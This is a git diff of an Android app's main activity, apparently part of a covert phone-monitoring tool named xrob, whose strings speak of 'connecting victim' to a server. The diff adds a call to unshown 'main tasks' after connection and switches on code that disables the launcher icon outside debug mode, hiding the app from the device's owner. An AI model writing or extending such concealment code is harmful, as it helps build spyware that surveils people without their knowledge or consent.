@@ -1,12 +1,9 @@
 package com.theah64.xrob.activities;
 
-import android.Manifest;
+import android.content.ComponentName;
 import android.content.DialogInterface;
 import android.content.pm.PackageManager;
-import android.os.Build;
 import android.os.Bundle;
-import android.support.annotation.NonNull;
-import android.support.v7.app.AppCompatActivity;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.Toast;
@@ -18,6 +15,7 @@ import com.theah64.xrob.utils.APIResponse;
 import com.theah64.xrob.utils.DialogUtils;
 import com.theah64.xrob.utils.OkHttpUtils;
 import com.theah64.xrob.utils.ProgressManager;
+import com.theah64.xrob.utils.Xrob;
 
 import org.json.JSONException;
 
@@ -60,7 +58,7 @@ public class MainActivity extends PermissionActivity {
             new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
 
                 @Override
-                public void onReadyToRequest(String apiKey) {
+                public void onReadyToRequest(final String apiKey) {
 
                     progressManager.showLoading(getString(R.string.Connecting_victim_to_s, clientCode));
 
@@ -91,9 +89,12 @@ public class MainActivity extends PermissionActivity {
                                 @Override
                                 public void run() {
                                     progressManager.showMainView();
+                                    Xrob.doMainTasks(MainActivity.this, apiKey);
+
                                     try {
                                         final String message = new APIResponse(jsonResp).getMessage();
                                         etClientCode.setText(null);
+
                                         dialogUtils.showSimpleMessage(R.string.Connected, message, new DialogInterface.OnDismissListener() {
                                             @Override
                                             public void onDismiss(DialogInterface dialogInterface) {
@@ -140,15 +141,15 @@ public class MainActivity extends PermissionActivity {
 
 
     @Override
-    protected void onStop() {
-
-       /* //TODO: Un comment on release . Hiding launcher icon
-        PackageManager p = getPackageManager();
-        ComponentName componentName = new ComponentName(this, MainActivity.class);
-        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
+    protected void onDestroy() {
+        if (!Xrob.IS_DEBUG_MODE) {
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        }
 
         OkHttpUtils.cancelCall(connectCall);
-        super.onStop();
+        super.onDestroy();
     }
 
     private void doNormalWork() {
